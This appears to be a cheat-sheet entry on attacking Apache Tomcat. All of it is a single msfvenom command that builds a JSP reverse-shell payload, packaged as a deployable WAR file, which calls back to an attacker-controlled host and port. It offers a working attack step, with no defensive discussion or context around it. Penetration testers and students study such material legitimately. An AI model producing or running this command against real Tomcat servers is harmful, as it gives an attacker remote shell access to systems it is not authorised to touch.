# Tomcat
## Reverse Shell Via WAR File
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.3 LPORT=80 -f war -o revshell.war
```